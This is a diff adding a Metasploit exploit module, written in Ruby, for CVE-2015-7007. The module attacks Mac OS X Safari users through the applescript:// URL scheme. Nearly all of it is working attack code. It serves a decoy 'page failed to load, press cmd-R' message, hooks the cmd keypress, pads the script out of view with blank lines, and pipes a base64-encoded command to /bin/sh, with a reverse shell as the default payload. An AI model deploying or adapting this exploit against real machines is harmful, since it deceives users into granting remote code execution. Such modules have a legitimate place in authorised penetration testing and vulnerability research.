@@ -1,0 +1,93 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+  Rank = ManualRanking
+
+  include Msf::Exploit::EXE
+  include Msf::Exploit::Remote::BrowserExploitServer
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Safari User-Assisted Applescript Exec Attack',
+      'Description'    => %q{
+        In versions of Mac OS X before 10.11.1, the applescript:// URL
+        scheme is provided, which opens the provided script in the Applescript
+        Editor. Pressing cmd-R in the Editor executes the code without any
+        additional confirmation from the user. By getting the user to press
+        cmd-R in Safari, and by hooking the cmd-key keypress event, a user
+        can be tricked into running arbitrary Applescript code.
+
+        Gatekeeper should be disabled from Security & Privacy in order to
+        avoid the unidentified Developer prompt.
+      },
+      'License'         => MSF_LICENSE,
+      'Arch'            => ARCH_CMD,
+      'Platform'        => ['unix', 'osx'],
+      'Compat'          =>
+        {
+          'PayloadType' => 'cmd'
+        },
+      'Targets'         =>
+        [
+          [ 'Mac OS X', {} ]
+        ],
+      'DefaultOptions' => { 'payload' => 'cmd/unix/reverse_python' },
+      'DefaultTarget'   => 0,
+      'DisclosureDate'  => 'Oct 16 2015',
+      'Author'          => [ 'joev' ],
+      'References'     =>
+        [
+          [ 'CVE', '2015-7007' ],
+          [ 'URL', 'https://support.apple.com/en-us/HT205375' ]
+        ],
+      'BrowserRequirements' => {
+        :source  => 'script',
+        :ua_name => HttpClients::SAFARI,
+        :os_name => OperatingSystems::Match::MAC_OSX
+      }
+    ))
+
+    register_options([
+      OptString.new('CONTENT', [false, "Content to display in browser",
+        "This page has failed to load. Press cmd-R to refresh."]),
+      OptString.new('WritableDir', [true, 'Writable directory', '/.Trashes'])
+    ], self.class)
+  end
+
+  def on_request_exploit(cli, request, profile)
+    print_status("Sending #{self.name}")
+    send_response_html(cli, exploit_html)
+  end
+
+  def exploit_html
+    "<!doctype html><html><body>#{content}<script>#{exploit_js}</script></body></html>"
+  end
+
+  def exploit_js
+    js_obfuscate %Q|
+      var as = Array(150).join("\\n") +
+        'do shell script "echo #{Rex::Text.encode_base64(sh)} \| base64 --decode \| /bin/sh"';
+      var url = 'applescript://com.apple.scripteditor?action=new&script='+encodeURIComponent(as);
+      window.onkeydown = function(e) {
+        if (e.keyCode == 91) {
+          window.location = url;
+        }
+      };
+    |
+  end
+
+  def sh
+    'killall "Script Editor"; nohup ' + payload.encoded
+  end
+
+  def content
+    datastore['CONTENT']
+  end
+
+
+end
